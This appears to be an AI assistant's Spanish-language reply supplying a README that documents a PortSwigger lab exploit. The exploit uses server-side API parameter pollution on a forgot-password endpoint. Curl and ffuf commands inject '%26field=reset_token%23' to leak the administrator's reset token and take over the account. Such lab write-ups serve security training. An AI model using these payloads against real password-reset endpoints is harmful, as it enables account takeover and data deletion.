Aquí tienes un **README.md** realista y técnico, diseñado para que lo guardes en tu carpeta de prácticas. Está redactado con el enfoque de un profesional que documenta una vulnerabilidad para un reporte de Bug Bounty.

---

# Explotación de API Parameter Pollution (Account Takeover)

Este repositorio contiene la documentación y comandos utilizados para comprometer la cuenta de administrador en el entorno de pruebas de PortSwigger, mediante la manipulación de parámetros en una API interna.

## 💀 Vulnerabilidad: API Parameter Pollution (HPP)

La aplicación falla al sanear la entrada del usuario en el parámetro `username`, permitiendo la inyección de caracteres de control HTTP (`&` y `#`) que son interpretados por una API backend persistente.

## 🛠️ Herramientas Utilizadas

* **Termux** (Entorno de ejecución)
* **Curl** (Interacción con la API)
* **Ffuf** (Fuzzing de parámetros ocultos)

---

## 📑 Proceso de Explotación

### 1. Descubrimiento de Inyección

Se identificó que el servidor backend concatena la entrada del usuario. Al enviar un carácter de unión (`&` codificado como `%26`), el servidor responde con un error de parámetro no soportado, confirmando la comunicación con una API interna.

```bash
# Inyección de parámetro arbitrario 'x'
curl -d "username=administrator%26x=y" "$URL/forgot-password"
# Respuesta: {"error": "Parameter is not supported"}

```

### 2. Truncamiento y Fuzzing

Se utilizó el carácter `#` (`%23`) para anular el resto de la consulta interna. Esto reveló la existencia de un campo obligatorio llamado `field`. Se realizó un fuzzing sobre este campo para identificar variables válidas del servidor.

```bash
# Fuzzing de campos internos con ffuf
ffuf -u "$URL/forgot-password" \
     -d "username=administrator%26field=FUZZ%23" \
     -w ./wordlists/api_fields.txt -mc 200

```

**Campos identificados:** `email`, `reset_token`.

### 3. Extracción de Credenciales (Exfiltración)

Al solicitar el campo `reset_token` mediante la inyección, el backend devuelve el token de seguridad directamente en la respuesta JSON, saltándose el envío por correo electrónico.

```bash
# Comando definitivo de extracción
curl -b cookies.txt -d "username=administrator%26field=reset_token%23" "$URL/forgot-password"

```

**Resultado:** `{"result":"hmkgd7e2dre31i5m91lsg7y66hfl97fv","type":"reset_token"}`

---

## 🏁 Conclusión del Ataque

1. **Acceso:** Uso del token robado en el endpoint `/forgot-password?reset_token=[TOKEN]`.
2. **Impacto:** Cambio de contraseña del usuario `administrator`.
3. **Privilegios:** Acceso total al panel de administración y borrado de usuarios.

---

### 🚀 Lecciones para Marzo 2026

* **Lógica de Negocio:** Siempre buscar cómo se pasan los datos entre el servidor A y el servidor B.
* **Fuzzing Inteligente:** No solo buscar carpetas, buscar **nombres de variables** internas.
* **Payloads:** Recordar el uso de `%26` para añadir y `%23` para limpiar.

---
